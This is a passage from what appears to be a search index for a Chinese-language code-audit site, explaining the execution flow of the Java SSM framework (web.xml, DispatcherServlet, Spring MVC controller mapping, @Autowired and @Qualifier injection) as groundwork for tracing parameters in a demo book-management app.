\u907f\u514d\u4e86\u51e0\u4e4e\u6240\u6709\u7684 JDBC \u4ee3\u7801\u548c\u624b\u52a8\u8bbe\u7f6e\u53c2\u6570\u4ee5\u53ca\u83b7\u53d6\u7ed3\u679c\u96c6\u3002MyBatis \u53ef\u4ee5\u5bf9\u914d\u7f6e\u548c\u539f\u751f Map \u4f7f\u7528\u7b80\u5355\u7684 XML \u6216\u6ce8\u89e3\uff0c\u5c06\u63a5\u53e3\u548c Java \u7684 POJO\uff08Plain Old Java Object\uff0c\u666e\u901a\u7684 Java \u5bf9\u8c61\uff09\u6620\u5c04\u6210\u6570\u636e\u5e93\u4e2d\u7684\u8bb0\u5f55\u3002</li> <li>Servlet\uff1aSpring MVC \u7684\u5e95\u5c42\u5c31\u662f\u4ee5 Servlet \u6280\u672f\u8fdb\u884c\u6784\u5efa\u7684\u3002Servlet \u662f\u57fa\u4e8e Java \u6280\u672f\u7684Web \u7ec4\u4ef6\uff0c\u7531\u5bb9\u5668\u7ba1\u7406\u5e76\u4ea7\u751f\u52a8\u6001\u7684\u5185\u5bb9\u3002Servlet \u4e0e\u5ba2\u6237\u7aef\u901a\u8fc7 Servlet \u5bb9\u5668\u5b9e\u73b0\u7684\u8bf7\u6c42/\u54cd\u5e94\u6a21\u578b\u8fdb\u884c\u4ea4\u4e92</li> </ol>"},{"location":"Code_audit/Java/Java-5/SSM/index.html#2ssm","title":"2.SSM \u6846\u67b6\u4ee3\u7801\u7684\u6267\u884c\u6d41\u7a0b\u548c\u5ba1\u8ba1\u601d\u8def","text":"<p>\u4ee3\u7801\u5ba1\u8ba1\u7684\u6838\u5fc3\u601d\u60f3\u662f\u8ffd\u8e2a\u53c2\u6570\uff0c\u800c\u8ffd\u8e2a\u53c2\u6570\u7684\u6b65\u9aa4\u5c31\u662f\u7a0b\u5e8f\u6267\u884c\u7684\u6b65\u9aa4\u3002\u56e0\u6b64\uff0c\u4ee3\u7801\u5ba1\u8ba1\u662f\u4e00\u4e2a\u8ddf\u8e2a\u7a0b\u5e8f\u6267\u884c\u6b65\u9aa4\u7684\u8fc7\u7a0b\uff0c\u4e86\u89e3\u4e86 SSM \u6846\u67b6\u7684\u6267\u884c\u6d41\u7a0b\u81ea\u7136\u4f1a\u4e86\u89e3\u5982\u4f55\u5982\u8ddf\u8e2a\u4e00\u4e2a\u53c2\u6570\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u89c2\u5bdf\u5728\u53c2\u6570\u4f20\u9012\u7684\u8fc7\u7a0b\u4e2d\u6709\u6ca1\u6709\u4e00\u4e9b\u5e38\u89c1\u7684\u6f0f\u6d1e\u70b9\u3002</p> <p>\u8fd9\u91cc\u901a\u8fc7\u521b\u5efa\u4e00\u4e2a\u7b80\u5355\u7684 Demo \u6765\u63cf\u8ff0\u57fa\u4e8eSSM \u6846\u67b6\u642d\u5efa\u7684\u9879\u76ee\u5b8c\u6210\u7528\u6237\u8bf7\u6c42\u7684\u5177\u4f53\u6d41\u7a0b\uff0c\u4ee5\u53ca\u89c2\u5bdf\u7a0b\u5e8f\u5bf9\u53c2\u6570\u7684\u8fc7\u6ee4\u662f\u5982\u4f55\u5904\u7406\u7684\u3002\u4e0b\u56fe\u5c55\u793a\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u56fe\u4e66\u7ba1\u7406\u7a0b\u5e8f\u7684\u76ee\u5f55\u7ed3\u6784\uff0c\u4e3b\u8981\u529f\u80fd\u662f\u5bf9\u56fe\u4e66\u540d\u79f0\u7684\u589e\u3001\u5220\u3001\u67e5\u3001\u6539\u3002\u65e0\u8bba\u662f\u5ba1\u8ba1\u4e00\u4e2a\u666e\u901a\u9879\u76ee\u6216\u8005\u662f Tomcat \u6240\u52a0\u8f7d\u7684\u9879\u76ee\uff0c\u901a\u5e38\u90fd\u4ece web.xml \u914d\u7f6e\u6587\u4ef6\u5f00\u59cb\u5165\u624b\u3002Servlet 3.0 \u4ee5\u4e0a\u7248\u672c\u63d0\u4f9b\u4e00\u4e9b\u65b0\u6ce8\u89e3\u6765\u8fbe\u5230\u4e0e\u914d\u7f6e web.xml\u76f8\u540c\u7684\u6548\u679c\u3002\u4f46\u662f\u5728\u5b9e\u9645\u9879\u76ee\u4e2d\u4e3b\u6d41\u7684\u914d\u7f6e\u65b9\u6cd5\u4ecd\u7136\u662f web.xml\u3002</p> <p></p> <p>web.xml \u6587\u4ef6\u7684\u4e3b\u8981\u5de5\u4f5c\u5305\u62ec\u4ee5\u4e0b\u51e0\u4e2a\u90e8\u5206\u3002</p> <ul> <li>web.xml \u542f\u52a8 Spring \u5bb9\u5668\u3002</li> <li>DispathcherServlet \u7684\u58f0\u660e\u3002</li> <li>\u5176\u4f59\u5de5\u4f5c\u662f session \u8fc7\u671f\u3001\u5b57\u7b26\u4e32\u7f16\u7801\u7b49\u3002</li> </ul> <p>\u9996\u5148\u662f\u751f\u6210 DispatcherServlet \u7c7b\u3002DispatcherServlet\u662f\u524d\u7aef\u63a7\u5236\u5668\u8bbe\u8ba1\u6a21\u5f0f\u7684\u5b9e\u73b0\uff0c\u63d0\u4f9b Spring Web MVC \u7684\u96c6\u4e2d\u8bbf\u95ee\u70b9\uff08\u4e5f\u5c31\u662f\u628a\u524d\u7aef\u8bf7\u6c42\u5206\u53d1\u5230\u76ee\u6807Controller\uff09\uff0c\u800c\u4e14\u4e0e Spring IoC \u5bb9\u5668\u65e0\u7f1d\u96c6\u6210\uff0c\u4ece\u800c\u53ef\u4ee5\u5229\u7528 Spring \u7684\u6240\u6709\u4f18\u70b9\u3002</p> <p>\u7b80\u5355\u5730\u7406\u89e3\u5c31\u662f\uff0c\u5c06\u7528\u6237\u7684\u8bf7\u6c42\u8f6c\u53d1\u81f3 Spring MVC \u4e2d\uff0c\u4ea4\u7531 Spring MVC \u7684 Controller \u8fdb\u884c\u66f4\u591a\u5904\u7406\u3002</p> <p>\u5b50\u6807\u7b7e\u662f\u751f\u6210DispatcherServlet\u65f6\u7684\u521d\u59cb\u5316\u53c2\u6570 <code>contextConfigLocation</code>\uff0cSpring \u4f1a\u6839\u636e\u8be5\u53c2\u6570\u52a0\u8f7d\u6240\u6709\u9017\u53f7\u5206\u9694\u7684 xml \u6587\u4ef6\u3002\u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u53c2\u6570\uff0c Spring \u9ed8\u8ba4\u52a0\u8f7d<code>WEB-INF/DispatcherServlet-servlet.xml</code>\u6587\u4ef6\u3002 <p>\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6807\u7b7e\u4e2d\u8fd8\u6709\u4e00\u4e2a\u5b50\u6807\u7b7e\uff0c\u5176\u4e2d value\u662f\u201c/\u201d\u4ee3\u8868\u62e6\u622a\u6240\u6709\u8bf7\u6c42\u3002\u4e0b\u56fe\u4e2d\u8fd8\u5305\u542b\u6807\u7b7e\uff0c\u5177\u4f53\u529f\u80fd\u4f1a\u5728\u540e\u9762\u8fdb\u884c\u4ecb\u7ecd\u3002 <p></p>"},{"location":"Code_audit/Java/Java-5/SSM/index.html#3spring-applicationcontextxml","title":"3.Spring \u6838\u5fc3\u914d\u7f6e\u6587\u4ef6 applicationContext.xml","text":"<p>\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u52a0\u8f7d\u987a\u5e8f\u67e5\u770b applicationContext.xml</p> <p></p> <p>applicationContext.xml \u4e2d\u5305\u542b 3 \u4e2a\u914d\u7f6e\u6587\u4ef6\uff0c\u5b83\u4eec\u662f Spring \u7528\u6765\u6574\u5408 Spring MVC\u548c MyBaits \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\u90fd\u53ef\u4ee5\u76f4\u63a5\u5199\u5165 applicationContext.xml \u4e2d\uff0c\u56e0\u4e3a applicationContext.xml \u662f Spring \u7684\u6838\u5fc3\u914d\u7f6e\u6587\u4ef6\uff0c\u4f8b\u5982\u751f\u6210 Bean\uff0c\u914d\u7f6e\u8fde\u63a5\u6c60\uff0c\u751f\u6210 sqlSessionFactory\u3002\u4f46\u662f\u4e3a\u4e86\u4fbf\u4e8e\u7406\u89e3\uff0c\u8fd9\u4e9b\u914d\u7f6e\u5206\u522b\u5199\u5728 3 \u4e2a\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u7531applicationContext.xml \u5c06 3 \u4e2a xml \u8fdb\u884c\u5173\u8054\u3002\u7531\u4e0b\u56fe\u6211\u4eec\u53ef\u4ee5\u6e05\u6670\u5730\u770b\u5230applicationContext.xml \u5c06\u8fd9 3 \u4e2a\u914d\u7f6e\u6587\u4ef6\u5173\u8054\u4e86\u8d77\u6765\u3002</p> <p></p> <p>\u6570\u636e\u7ecf\u7531 DispatcherServlet \u6d3e\u53d1\u81f3 Spring-mvc.xml \u7684 Controller \u5c42\u3002\u6211\u4eec\u5148\u770bSpring-mvc.xml \u914d\u7f6e\u6587\u4ef6</p> <p></p>"},{"location":"Code_audit/Java/Java-5/SSM/index.html#1","title":"\uff081\uff09\u6807\u7b7e\u3002","text":"<p>\u5982\u679c\u5728 web.xml \u4e2d servlet-mapping \u7684 url-pattern \u8bbe\u7f6e\u7684\u662f/\uff0c\u800c\u4e0d\u662f.do\uff0c\u8868\u793a\u5c06\u6240\u6709\u7684\u6587\u4ef6\u5305\u542b\u9759\u6001\u8d44\u6e90\u6587\u4ef6\u90fd\u4ea4\u7ed9 Spring MVC \u5904\u7406\uff0c\u8fd9\u65f6\u9700\u8981\u7528\u5230\u3002\u5982\u679c\u4e0d\u52a0\uff0c\u5219 DispatcherServlet \u65e0\u6cd5\u533a\u5206\u8bf7\u6c42\u662f\u8d44\u6e90\u6587\u4ef6\u8fd8\u662f MVC \u7684\u6ce8\u89e3\uff0c\u800c\u5bfc\u81f4 Controller \u7684\u8bf7\u6c42\u62a5 404 \u9519\u8bef\u3002</p>"},{"location":"Code_audit/Java/Java-5/SSM/index.html#2","title":"\uff082\uff09\u6807\u7b7e\u3002","text":"<p>\u5728 Spring-mvc.xml \u4e2d\u914d\u7f6e\u540e\uff0c\u4f1a\u5728 Spring MVC \u4e0a\u4e0b\u6587\u4e2d\u5b9a\u4e49\u4e00\u4e2a org.springframework.web.servlet.resource.DefaultServletHttp-RequestHandler\uff0c\u5b83\u4f1a\u50cf\u68c0\u67e5\u5458\u4e00\u6837\u5bf9\u8fdb\u5165 DispatcherServlet \u7684 URL \u8fdb\u884c\u7b5b\u67e5\u3002\u5982\u679c\u662f\u9759\u6001\u8d44\u6e90\u7684\u8bf7\u6c42\uff0c\u5c31\u5c06\u8be5\u8bf7\u6c42\u8f6c\u7531 Web \u5e94\u7528\u670d\u52a1\u5668\u9ed8\u8ba4\u7684 Servlet \u5904\u7406\uff1b\u5982\u679c\u4e0d\u662f\u9759\u6001\u8d44\u6e90\u7684\u8bf7\u6c42\uff0c\u5219\u4ea4\u7531 DispatcherServlet \u7ee7\u7eed\u5904\u7406\u3002</p> <p>\u5176\u4f59\u4e24\u9879\u4e4b\u4e00\u662f\u6307\u5b9a\u4e86\u8fd4\u56de\u7684 view \u6240\u5728\u7684\u8def\u5f84\uff0c\u53e6\u4e00\u4e2a\u662f\u6307\u5b9a Spring MVC \u6ce8\u89e3\u7684\u626b\u63cf\u8def\u5f84\uff0c\u53ef\u4ee5\u53d1\u73b0\u8be5\u914d\u7f6e\u6587\u4ef6\u4e2d\u90fd\u662f\u4e0e Spring-mvc \u76f8\u5173\u7684\u914d\u7f6e\u3002</p>"},{"location":"Code_audit/Java/Java-5/SSM/index.html#4ssm-spring-mvc","title":"4.SSM \u4e4b Spring MVC \u6267\u884c\u6d41\u7a0b","text":"<p>\u63a5\u4e0b\u6765\u5c31\u662f Spring MVC Controller \u5c42\u63a5\u53d7\u524d\u53f0\u4f20\u5165\u7684\u6570\u636e\u3002\u4ee5\u4e0b\u901a\u8fc7 DEMO \u8fd0\u884c\u4ee5\u65b9\u4fbf\u6f14\u793a\u548c\u8bb2\u89e3\uff0c\u9996\u9875\u5982\u56fe\u6240\u793a\u3002</p> <p></p> <p>\u67e5\u770b\u9996\u9875\u7684\u9875\u9762\u6e90\u7801</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230 a \u6807\u7b7e\u7684\u8d85\u94fe\u63a5\u662f <code>http://localhost:8080/SSMFrameWorkTest_war/ book/allbook</code>\u3002</p> <p><code>${pageContext.request.contextPath}</code>\u662f JSP \u53d6\u5f97\u7edd\u5bf9\u8def\u5f84\u7684\u65b9\u6cd5, \u4e5f\u5c31\u662f\u53d6\u51fa\u90e8\u7f72\u7684\u5e94\u7528\u7a0b\u5e8f\u540d\u6216\u8005\u662f\u5f53\u524d\u7684\u9879\u76ee\u540d\u79f0\uff0c\u907f\u514d\u5728\u628a\u9879\u76ee\u90e8\u7f72\u5230\u751f\u4ea7\u73af\u5883\u4e2d\u65f6\u51fa\u9519\u3002</p> <p>\u6b64\u65f6\u540e\u53f0\u6536\u5230\u7684\u8bf7\u6c42\u8def\u5f84\u4e3a<code>/book/allBook</code>\u3002Spring MVC \u5728\u9879\u76ee\u542f\u52a8\u65f6\u4f1a\u9996\u5148\u53bb\u626b\u63cf\u6211\u4eec\u6307\u5b9a\u7684\u8def\u5f84\uff0c\u5373 <code>com.ssm_project.controller</code> \u8def\u5f84\u4e0b\u7684\u6240\u6709\u7c7b\u3002<code>BookController</code>\u7c7b\u7684\u4ee3\u7801\u5982\u56fe\u6240\u793a\u3002</p> <p>Spring MVC \u4f1a\u626b\u63cf\u8be5\u7c7b\u4e2d\u7684\u6240\u6709\u6ce8\u89e3\uff0c\u770b\u5230@Controller \u65f6\u4f1a\u751f\u6210\u8be5 Controller\u7684 Bean\uff0c\u626b\u63cf\u5230@RequestMappting \u6ce8\u89e3\u65f6\u4f1a\u5c06@RequestMappting \u4e2d\u7684 URI \u4e0e\u4e0b\u9762\u7684\u65b9\u6cd5\u5f62\u6210\u6620\u5c04\u3002\u6240\u4ee5\u6211\u4eec\u8bf7\u6c42\u7684 URI \u662f\u201c/book/allBool\u201d\uff0cSpring MVC \u4f1a\u5c06\u6570\u636e\u4ea4\u7531 BookController \u7c7b\u7684 list \u65b9\u6cd5\u6765\u5904\u7406\u3002</p> <p>\u5728Spring\u6846\u67b6\u4e2d\uff0cBean\u662f\u4e00\u4e2a\u88abSpring IoC\u5bb9\u5668\u7ba1\u7406\u7684\u5bf9\u8c61\u3002\u7b80\u5355\u5730\u8bf4\uff0cBean\u5c31\u662f\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u5bf9\u8c61\uff0c\u7531Spring\u5bb9\u5668\u8d1f\u8d23\u5b9e\u4f8b\u5316\u3001\u88c5\u914d\u548c\u7ba1\u7406\u3002\u901a\u8fc7Spring\u7684\u4f9d\u8d56\u6ce8\u5165\u673a\u5236\uff0cBean\u53ef\u4ee5\u88ab\u81ea\u52a8\u88c5\u914d\u5230\u9700\u8981\u5b83\u7684\u5730\u65b9\u3002</p> <p>\u5728Spring MVC\u4e2d\uff0c@Controller\u6ce8\u89e3\u7528\u4e8e\u6807\u8bc6\u4e00\u4e2a\u7c7b\u4f5c\u4e3a\u63a7\u5236\u5668\uff0c\u800c@RequestMapping\u6ce8\u89e3\u5219\u7528\u4e8e\u5c06HTTP\u8bf7\u6c42\u6620\u5c04\u5230\u76f8\u5e94\u7684\u5904\u7406\u65b9\u6cd5\u4e0a\u3002\u5f53Spring\u5bb9\u5668\u626b\u63cf\u5230\u88ab@Controller\u6ce8\u89e3\u6807\u8bc6\u7684\u7c7b\u65f6\uff0c\u4f1a\u521b\u5efa\u8be5\u7c7b\u7684\u5b9e\u4f8b\u4f5c\u4e3a\u4e00\u4e2aBean\uff0c\u5e76\u5c06\u5176\u653e\u5165IoC\u5bb9\u5668\u4e2d\u7ba1\u7406\u3002\u540c\u65f6\uff0c\u5f53\u626b\u63cf\u5230\u88ab@RequestMapping\u6ce8\u89e3\u6807\u8bc6\u7684\u65b9\u6cd5\u65f6\uff0cSpring\u4f1a\u5efa\u7acb\u8bf7\u6c42\u8def\u5f84\u548c\u65b9\u6cd5\u4e4b\u95f4\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u4ee5\u4fbf\u6839\u636e\u8bf7\u6c42\u8def\u5f84\u627e\u5230\u5bf9\u5e94\u7684\u65b9\u6cd5\u8fdb\u884c\u5904\u7406\u3002</p> <p>\u56e0\u6b64\uff0c\u5728\u4f60\u63d0\u5230\u7684\u4f8b\u5b50\u4e2d\uff0c\u5f53\u8bf7\u6c42URI\u4e3a\"/book/allBook\"\u65f6\uff0cSpring MVC\u4f1a\u67e5\u627e\u4e0e\u8be5URI\u5339\u914d\u7684\u63a7\u5236\u5668\u65b9\u6cd5\uff0c\u7136\u540e\u8c03\u7528\u76f8\u5e94\u7684\u65b9\u6cd5\u5904\u7406\u8be5\u8bf7\u6c42\u3002\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0cBookController\u7c7b\u4f1a\u88ab\u5b9e\u4f8b\u5316\u4e3a\u4e00\u4e2aBean\uff0c\u5e76\u4e14\u5176\u4e2d\u7684list\u65b9\u6cd5\u4f1a\u88ab\u6620\u5c04\u4e3a\u5904\u7406\u8bf7\u6c42\"/book/allBook\"\u7684\u65b9\u6cd5\u3002Bean\u7684\u5b58\u5728\u4f7f\u5f97Spring\u80fd\u591f\u66f4\u52a0\u7075\u6d3b\u5730\u7ba1\u7406\u548c\u7ec4\u7ec7\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u7ec4\u4ef6\uff0c\u5e76\u5b9e\u73b0\u4f9d\u8d56\u6ce8\u5165\u548c\u63a7\u5236\u53cd\u8f6c\u7b49\u7279\u6027\u3002</p> <p></p> <p>\u4ed4\u7ec6\u89c2\u5bdf list \u65b9\u6cd5\uff0c\u5176\u4e2d\u8c03\u7528\u4e86 bookService \u53c2\u6570\u7684 queryAllBook \u65b9\u6cd5\uff0c\u8fd9\u91cc\u4f7f\u7528\u4e86\u4e24\u4e2a\u6ce8\u89e3\uff1a@Autowired \u548c@Qualifier\u3002\u8fd9\u4e24\u4e2a\u6ce8\u89e3\u7684\u4f5c\u7528\u7b80\u5355\u4ecb\u7ecd\u5982\u4e0b\u3002</p> <p>@Autowired\uff1a\u53ef\u4ee5\u7528\u4e8e\u81ea\u52a8\u88c5\u914d bean\uff0c\u5373\u5c06\u7b26\u5408\u7c7b\u578b\u7684 bean \u6ce8\u5165\u5230\u6807\u6ce8\u4e86 @Autowired \u7684\u5b57\u6bb5\u3001\u6784\u9020\u65b9\u6cd5\u6216\u65b9\u6cd5\u53c2\u6570\u4e2d\u3002\u5f53\u5bb9\u5668\u4e2d\u5b58\u5728\u591a\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684 bean \u65f6\uff0c@Autowired \u4f1a\u6839\u636e\u7c7b\u578b\u8fdb\u884c\u81ea\u52a8\u88c5\u914d\u3002\u5982\u679c\u5b58\u5728\u591a\u4e2a\u5339\u914d\u7684 bean\uff0cSpring \u5c06\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u9664\u975e\u5728\u591a\u4e2a\u5019\u9009 bean \u4e0a\u4f7f\u7528 @Primary \u6ce8\u89e3\u6765\u6307\u5b9a\u4f18\u5148\u7ea7\u3002</p> <p>@Qualifier\uff1a\u5f53\u5b58\u5728\u591a\u4e2a\u76f8\u540c\u7c7b\u578b\u7684 bean \u65f6\uff0c@Qualifier \u6ce8\u89e3\u53ef\u4ee5\u4e0e @Autowired \u4e00\u8d77\u4f7f\u7528\uff0c\u901a\u8fc7\u6307\u5b9a bean \u7684\u540d\u79f0\u6765\u7cbe\u786e\u5730\u9009\u62e9\u8981\u6ce8\u5165\u7684 bean\u3002\u5728\u4f7f\u7528 @Qualifier \u6ce8\u89e3\u65f6\uff0c\u901a\u5e38\u4e0e bean \u7684 id \u6216\u540d\u79f0\u4e00\u8d77\u4f7f\u7528\uff0c\u4ee5\u4fbf\u7cbe\u786e\u6307\u5b9a\u8981\u6ce8\u5165\u7684 bean\u3002\u5982\u679c\u5728\u6ca1\u6709\u4f7f\u7528 @Qualifier \u6ce8\u89e3\u7684\u60c5\u51b5\u4e0b\u5b58\u5728\u591a\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684 bean\uff0cSpring \u5c06\u4f1a\u629b\u51fa NoUniqueBeanDefinitionException \u5f02\u5e38\u3002\u56e0\u6b64\uff0c@Qualifier \u4e3b\u8981\u7528\u4e8e\u89e3\u51b3\u591a\u4e2a\u5019\u9009 bean \u7684\u6b67\u4e49\u6027\u95ee\u9898\u3002</p> <p>\u7531\u6b64\u53ef\u4ee5\u770b\u5230 <code>bookService</code> \u53c2\u6570\u7684\u7c7b\u578b\u662f <code>BookService</code> \u7c7b\u578b\uff0c\u901a\u8fc7\u6ce8\u89e3\u81ea\u52a8\u6ce8\u5165\u7684 Bean \u7684 id \u53eb\u4f5c <code>BookServiceImpl</code>\u3002</p> <p>@Qualifier(\"BookServiceImpl\")\u7684\u4f5c\u7528\uff1a</p> <p>\u5c06 BookServiceImpl \u6ce8\u5165\u5230\u4e00\u4e2a\u7c7b\u4e2d\u901a\u5e38\u8868\u793a\u8be5\u7c7b\u4f9d\u8d56\u4e8e BookServiceImpl\uff0c\u5373\u8be5\u7c7b\u9700\u8981\u4f7f\u7528 BookServiceImpl \u63d0\u4f9b\u7684\u529f\u80fd\u6216\u670d\u52a1\u3002</p> <p>\u5047\u8bbe\u6709\u4e00\u4e2a\u7c7b SomeClass\uff0c\u5b83\u9700\u8981\u4f7f\u7528 BookServiceImpl \u63d0\u4f9b\u7684\u4e00\u4e9b\u529f\u80fd\u6765\u5b8c\u6210\u81ea\u5df1\u7684\u4efb\u52a1\u3002\u901a\u8fc7\u5c06 BookServiceImpl \u6ce8\u5165\u5230 SomeClass \u4e2d\uff0cSomeClass \u5c31\u53ef\u4ee5\u5728\u9700\u8981\u65f6\u76f4\u63a5\u8c03\u7528 BookServiceImpl \u4e2d\u7684\u65b9\u6cd5\uff0c\u800c\u4e0d\u9700\u8981\u81ea\u5df1\u53bb\u521b\u5efa BookServiceImpl \u7684\u5b9e\u4f8b\u3002\u8fd9\u6837\u505a\u7684\u597d\u5904\u5305\u62ec\uff1a\u89e3\u8026\u5408\uff1aSomeClass \u4e0d\u9700\u8981\u76f4\u63a5\u4f9d\u8d56\u4e8e BookServiceImpl \u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u800c\u662f\u4f9d\u8d56\u4e8e BookService \u63a5\u53e3\uff0c\u4ece\u800c\u5b9e\u73b0\u4e86\u89e3\u8026\u5408\u3002\u8fd9\u6837\uff0c\u5728\u5c06\u6765\u5982\u679c\u9700\u8981\u66ff\u6362 BookServiceImpl \u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u53ea\u9700\u8981\u4fee\u6539\u914d\u7f6e\uff0c\u800c\u4e0d\u9700\u8981\u4fee\u6539 SomeClass \u7684\u4ee3\u7801</p> <p>\u5728 Spring \u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528 @Autowired \u6ce8\u89e3\u6765\u81ea\u52a8\u6ce8\u5165 BookServiceImpl\u3002\u5177\u4f53\u65b9\u6cd5\u53d6\u51b3\u4e8e\u4f60\u60f3\u8981\u6ce8\u5165\u7684\u5730\u65b9\uff1a\u662f\u5728\u53e6\u4e00\u4e2a Bean \u4e2d\uff0c\u8fd8\u662f\u5728 Spring MVC \u7684\u63a7\u5236\u5668\u4e2d\uff0c\u6216\u8005\u5176\u4ed6\u5730\u65b9\u3002</p> <p>\u5047\u8bbe\u4f60\u6709\u4e00\u4e2a\u7c7b SomeClass \u9700\u8981\u6ce8\u5165 BookServiceImpl\uff0c\u53ef\u4ee5\u6309\u7167\u4ee5\u4e0b\u6b65\u9aa4\u8fdb\u884c\u6ce8\u5165\uff1a</p> <p>1.\u5728 SomeClass \u7c7b\u4e2d\u58f0\u660e\u4e00\u4e2a BookService \u7c7b\u578b\u7684\u5b57\u6bb5\uff0c\u5e76\u4f7f\u7528 @Autowired \u6ce8\u89e3\u8fdb\u884c\u6ce8\u5165\uff1a</p> <p>public class SomeClass {</p> <p>@Autowired private BookService bookService;</p> <p>// \u5176\u4ed6\u65b9\u6cd5}</p> <p>\u5728\u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c@Autowired \u6ce8\u89e3\u7528\u4e8e\u5c06 BookServiceImpl \u6ce8\u5165\u5230 SomeClass \u7684 bookService \u5b57\u6bb5\u4e2d\u3002</p> <p>2.\u786e\u4fdd BookServiceImpl \u7c7b\u88ab Spring \u626b\u63cf\u5230\u5e76\u6ce8\u518c\u4e3a\u4e00\u4e2a Bean\u3002\u4f60\u53ef\u4ee5\u5728 BookServiceImpl \u7c7b\u4e0a\u6dfb\u52a0 @Service \u6ce8\u89e3\uff0c\u6216\u8005\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528 XML \u8fdb\u884c\u914d\u7f6e\u3002</p> <p>import org.springframework.stereotype.Service;</p> <p>@Service public class BookServiceImpl implements BookService {     // \u5b9e\u73b0 BookService \u63a5\u53e3\u7684\u65b9\u6cd5 }</p> <p>3.\u5728 Spring \u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u914d\u7f6e\u7ec4\u4ef6\u626b\u63cf\uff0c\u4ee5\u4fbf Spring \u80fd\u591f\u626b\u63cf\u5230\u5e76\u6ce8\u518c SomeClass \u548c BookServiceImpl\u3002</p> <p></p> <p>\u8fd9\u6837\uff0c\u5f53 Spring \u542f\u52a8\u65f6\uff0c\u5b83\u4f1a\u81ea\u52a8\u626b\u63cf\u6307\u5b9a\u7684\u5305\uff0c\u5e76\u5c06 SomeClass \u548c BookServiceImpl \u6ce8\u518c\u4e3a Spring \u7684 Bean\uff0c\u5e76\u4e14\u81ea\u52a8\u5c06 BookServiceImpl \u6ce8\u5165\u5230 SomeClass \u4e2d\u7684 bookService \u5b57\u6bb5\u4e2d\u3002</p>"},{"location":"Code_audit/Java/Java-5/SSM/index.html#5ssm-spring","title":"5.SSM \u4e4b Spring \u6267\u884c\u6d41\u7a0b","text":"<p>\u8fd9\u91cc\u6211\u4eec\u5c31\u8981\u4ece Spring MVC \u7684\u90e8\u5206\u8fc7\u6e21\u5230 Spring \u7684\u90e8\u5206\uff0c\u6240\u8c13\u7684\u8fc7\u6e21\u5c31\u662f\u6211\u4eec\u4ece Spring MVC \u7684 Controller \u5c42\u53bb\u8c03\u7528 Service \u5c42\uff0c\u800c Service \u5c42\u5c31\u662f\u6211\u4eec\u4f7f\u7528 Spring\u8fdb\u884c IoC \u63a7\u5236\u548c AOP \u7f16\u7a0b\u7684\u5730\u65b9\u3002</p> <p>\u9996\u5148\u6211\u4eec\u9700\u8981\u67e5\u770b\u914d\u7f6e\u6587\u4ef6 spring-service.xml\uff0c\u5982\u56fe</p> <p></p> <p>\u8fd9\u91cc\u6211\u4eec\u53d1\u73b0 id \u4e3a BookServiceImpl \u7684 bean\uff0c\u8be5 bean \u7684 class \u8def\u5f84\u662f <code>com.ssm_ project.service.BookServiceImpl</code>\u3002\u8fd9\u4e2a\u6807\u7b7e\u6d89\u53ca Spring \u4e00\u5927\u6838\u5fc3\u529f\u80fd\u70b9\uff0c\u5373 IoC\u3002\u672c\u6765\u7f16\u5199\u4e00\u4e2a\u9879\u76ee\u9700\u8981\u6211\u4eec\u81ea\u5df1\u624b\u52a8\u53bb\u521b\u5efa\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u5728\u4f7f\u7528\u4e86 Spring \u4ee5\u540e\u53ea\u9700\u8981\u751f\u6210\u7684\u90a3\u4e2a\u7c7b\u7684\u7edd\u5bf9\u8def\u5f84\uff0c\u4ee5\u53ca\u521b\u5efa\u4e00\u4e2a\u5b9e\u4f8b\u65f6\u9700\u8981\u4f20\u5165\u7684\u53c2\u6570\u3002\u4f20\u5165\u53c2\u6570\u7684\u65b9\u6cd5\u53ef\u4ee5\u662f\u901a\u8fc7\u6784\u9020\u65b9\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 set \u65b9\u6cd5\u3002\u7528\u6237\u8fd8\u53ef\u4ee5\u4e3a\u8fd9\u4e2a bean \u8bbe\u7f6e\u4e00\u4e2a\u540d\u79f0\u65b9\u4fbf\u8c03\u7528\uff08\u5982\u679c\u4e0d\u8bbe\u7f6e id \u53c2\u6570\u540d\uff0c\u5219 bean \u7684\u540d\u79f0\u9ed8\u8ba4\u4e3a\u7c7b\u540d\u5f00\u5934\u7684\u5c0f\u5199\u5b57\u6bcd\uff0c\u6bd4\u5982BookServiceImpl\uff0c\u5982\u4e0d\u7279\u522b\u6307\u5b9a\uff0c\u5219\u751f\u6210\u7684 bean \u7684\u540d\u79f0\u662f bookServiceImpl\uff09\u3002Spring\u4f1a\u5728\u542f\u52a8\u65f6\u5c06\u7528\u6237\u6307\u5b9a\u597d\u7684\u7c7b\u751f\u6210\u7684\u5b9e\u4f8b\u653e\u5165 IoC \u5bb9\u5668\u4e2d\u4f9b\u7528\u6237\u4f7f\u7528\u3002\u901a\u4fd7\u5730\u8bf4\u5c31\u662f\u672c\u6765\u7531\u7528\u6237\u624b\u52a8\u751f\u6210\u5b9e\u4f8b\u7684\u8fc7\u7a0b\u4ea4\u7531 Spring \u6765\u5904\u7406\uff0c\u8fd9\u5c31\u662f\u6240\u8c13\u7684\u63a7\u5236\u53cd\u8f6c\u3002 <p>\u63a5\u4e0b\u6765\u67e5\u770b BookServiceImpl \u7c7b\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5982\u56fe</p> <p></p> <p>\u9996\u5148\u770b\u5230\u8be5\u7c7b\u5b9e\u73b0\u4e86 BookService 